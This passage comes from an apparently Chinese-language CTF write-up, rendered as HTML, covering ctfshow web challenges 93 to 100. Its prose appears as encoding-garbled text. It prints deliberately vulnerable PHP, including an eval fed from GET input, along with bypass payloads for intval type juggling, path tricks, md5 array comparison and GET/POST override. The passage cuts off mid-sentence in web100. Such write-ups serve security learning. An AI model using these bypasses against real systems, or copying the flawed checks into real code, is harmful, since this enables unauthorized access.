class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸€å…³å’Œ90ä¸€æ ·</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031282.png"></p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031346.png"></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>é¦–å…ˆä¸èƒ½å®Œå…¨ç­‰äº4476ï¼Œä¹Ÿä¸èƒ½åŒ…å«ä»»ä½•å­—æ¯ï¼Œstrposå‡½æ•°æ£€æŸ¥numä¸­æ˜¯å¦åŒ…å«å­—ç¬¦&quot;0&quot;ï¼ˆå¿…é¡»åŒ…å«â€œ0â€ï¼‰ï¼Œæœ€åä½¿ç”¨intvalå‡½æ•°å°†numè½¬æ¢ä¸ºæ•´æ•°</p><p><code>strpos() </code>å‡½æ•°ï¼Œç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä¸€ä¸ªå­ä¸²çš„ç¬¬ä¸€æ¬¡å‡ºç°ä½ç½®ã€‚å¦‚æœæ‰¾åˆ°äº†å­ä¸²ï¼Œåˆ™è¿”å›å­ä¸²åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼ˆç´¢å¼•ï¼‰ï¼Œå¦åˆ™è¿”å› falseã€‚</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥è¾“å…¥4476.0æ¥ç»•è¿‡</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?num=4476.0<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031248.png"></p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥ $num æ˜¯å¦åŒ…å«å­—æ¯æˆ–å°æ•°ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">if(!strpos($num, &quot;0&quot;))&#123;<br>        die(&quot;no no no!!!&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ $num ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ â€œ0â€</p><p>å› ä¸ºæœ‰<code>strpos</code> å‡½æ•°ï¼Œå…«è¿›åˆ¶<code>010574</code>æ— æ³•è®©ç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031834.png"></p><p>è€Œåå…­è¿›åˆ¶<code>0x117c</code> åŒ…å«å­—æ¯ <code>x</code>ï¼Œå› æ­¤ <code>preg_match</code> ä¼šåŒ¹é…æˆåŠŸï¼Œæ— æ³•ç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031745.png"></p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨å‰é¢åŠ ä¸ª<code>+</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?num=+010574<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031384.png"></p><p>åŒæ ·ï¼ŒåŠ ç©ºæ ¼ä¹Ÿå¯ä»¥ç»•è¿‡ï¼ˆç©ºæ ¼æ˜¯<code>%20</code>ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031176.png"></p><h4 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>å¦‚æœ <code>u</code> çš„å€¼æ˜¯ <code>&#39;flag.php&#39;</code>ï¼Œä¼šè¾“å‡º <code>&quot;no no no&quot; </code>å¹¶åœæ­¢æ‰§è¡Œï¼›</p><p>å¦‚æœ <code>u</code> çš„å€¼ä¸æ˜¯ <code>&#39;flag.php&#39;</code>ï¼Œä¼šå°è¯•æ˜¾ç¤º <code>u</code> å‚æ•°æŒ‡å®šçš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä»¥è¯­æ³•é«˜äº®çš„å½¢å¼å±•ç¤ºã€‚</p><p>è¦æƒ³çœ‹åˆ°flag.phpæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶ç›®å½•æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?u=./flag.php<br></code></pre></td></tr></table></figure><p>&#x2F;   æ ¹ç›®å½•</p><p>.&#x2F;  å½“å‰ç›®å½•</p><p>..&#x2F;  ä¸Šä¸€ä¸ªç›®å½•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031668.png"></p><h4 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ol><li><code>if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) {</code>:æ£€æŸ¥ç”¨æˆ·æ˜¯å¦é€šè¿‡ POST è¯·æ±‚æäº¤äº†ä¸¤ä¸ªå‚æ•° <code>a</code> å’Œ <code>b</code>ã€‚å¦‚æœ <code>a</code> å’Œ <code>b</code> éƒ½å­˜åœ¨ï¼Œåˆ™ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ã€‚</li><li><code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])</code>:æ£€æŸ¥ç”¨æˆ·æäº¤çš„ <code>a</code> å’Œ <code>b</code> çš„å€¼æ˜¯å¦ä¸ç›¸ç­‰ã€‚å¦‚æœ <code>a</code> å’Œ <code>b</code> çš„å€¼ä¸ç›¸ç­‰ï¼Œåˆ™ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ã€‚</li><li><code>if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code>:è®¡ç®— <code>a</code> å’Œ <code>b</code> çš„ MD5 å“ˆå¸Œå€¼ï¼Œå¹¶è¿›è¡Œä¸¥æ ¼æ¯”è¾ƒï¼ˆ<code>===</code>ï¼‰ã€‚å¦‚æœ <code>a</code> å’Œ <code>b</code> çš„ MD5 å“ˆå¸Œå€¼ç›¸ç­‰ï¼Œåˆ™æ‰§è¡Œ <code>echo $flag;</code>ï¼Œè¾“å‡º <code>flag.php</code> å¦åˆ™ï¼Œæ‰§è¡Œ <code>print &#39;Wrong.&#39;;</code>ï¼Œè¾“å‡º â€œWrong.â€ã€‚</li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>è§£é¢˜æ€è·¯ï¼š</p><p>éœ€è¦åˆ©ç”¨MD5å¤„ç†æ•°ç»„æ—¶çš„ç‰¹æ€§ã€‚å½“ä¼ å…¥æ•°ç»„æ—¶ï¼Œ<code>md5()</code>å‡½æ•°ä¼šè¿”å›<code>null</code>ï¼Œå¹¶ä¸”å½“ä¸¤ä¸ªæ•°ç»„ä¸åŒä½†MD5éƒ½ä¸º<code>null</code>æ—¶ï¼Œä¸¥æ ¼æ¯”è¾ƒï¼ˆ<code>===</code>ï¼‰æˆç«‹ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ æ•°ç»„ï¼š</p><ol><li>é€šè¿‡POSTæäº¤<code>a</code>å’Œ<code>b</code>ä½œä¸ºæ•°ç»„ï¼Œä½¿å…¶å€¼ä¸åŒä½†MD5ç»“æœå‡ä¸º<code>null</code>ã€‚</li><li>ç¡®ä¿<code>a</code>ä¸ç­‰äº<code>b</code>ï¼Œä½†å®ƒä»¬çš„MD5å“ˆå¸Œä¸¥æ ¼ç›¸ç­‰ï¼Œä»è€Œè¾“å‡ºflagã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a[]=123&amp;b[]=456<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯postä¼ å‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031853.png"></p><h4 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span> ? <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_POST</span> : <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] == <span class="hljs-string">&#x27;flag&#x27;</span> ? <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_COOKIE</span> : <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] == <span class="hljs-string">&#x27;flag&#x27;</span> ? <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_SERVER</span> : <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>] == <span class="hljs-string">&#x27;flag&#x27;</span> ? <span class="hljs-variable">$flag</span> : <span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç æœ‰äº›å˜æ‰­ï¼Œç”¨aiè½¬åŒ–ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-comment">// ç¬¬ä¸€æ¬¡æ¡ä»¶ï¼šå¦‚æœå­˜åœ¨ GET å‚æ•°ï¼Œå°† $_GET æŒ‡å‘ $_POST</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>)) &#123;<br>    <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_POST</span>;<br>&#125;<br><br><span class="hljs-comment">// ç¬¬äºŒæ¬¡æ¡ä»¶ï¼šæ£€æŸ¥ $_GETï¼ˆæ­¤æ—¶å¯èƒ½æŒ‡å‘ $_POSTï¼‰ä¸­çš„ &#x27;flag&#x27; å‚æ•°</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_COOKIE</span>;<br>&#125;<br><br><span class="hljs-comment">// ç¬¬ä¸‰æ¬¡æ¡ä»¶ï¼šæ£€æŸ¥ $_GETï¼ˆæ­¤æ—¶å¯èƒ½æŒ‡å‘ $_COOKIEï¼‰ä¸­çš„ &#x27;flag&#x27; å‚æ•°</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_SERVER</span>;<br>&#125;<br><br><span class="hljs-comment">// æœ€ç»ˆå†³å®šæ˜¾ç¤º flag è¿˜æ˜¯å½“å‰æ–‡ä»¶</span><br><span class="hljs-variable">$fileToHighlight</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) ? <span class="hljs-variable">$flag</span> : <span class="hljs-keyword">__FILE__</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$fileToHighlight</span>);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$_GET[&#x27;flag&#x27;] == &#x27;flag&#x27; ? $_GET = &amp;$_COOKIE : &#x27;flag&#x27;;<br>$_GET[&#x27;flag&#x27;] == &#x27;flag&#x27; ? $_GET = &amp;$_SERVER : &#x27;flag&#x27;;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤è¡Œä»£ç å¯¹æœ€åflagçš„è¾“å‡ºæ²¡æœ‰å½±å“å› ä¸ºæœ€åæºä»£ç çš„æ˜¾ç¤ºä¸»è¦çœ‹getå‚æ•°HTTP_FLAG&#x3D;flagæ˜¯å¦æˆç«‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;] == &#x27;flag&#x27; ? $flag : __FILE__);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥getä¼ å‚HTTP_FLAG&#x3D;flagï¼Œå› ä¸ºå¦‚æœgetä¼ å‚å­˜åœ¨çš„è¯å°±ä¼šè¢«postè¦†ç›–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥getä¼ å‚ä»»æ„ä¸€ä¸ªæ•°ï¼ˆéšä¾¿ä¼ ä½†æ˜¯å¿…é¡»æœ‰ï¼‰ï¼Œç„¶åå†postä¼ å‚HTTP_FLAG&#x3D;flagè¦†ç›–getæ‰€ä¼ å‚æ•°çš„å€¼ï¼Œä¾¿å¯ä»¥æ˜¾ç¤ºflagã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031522.png"></p><h4 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-comment">//flag in class ctfshow;</span><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$v0</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>)) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$v0</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>)) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç 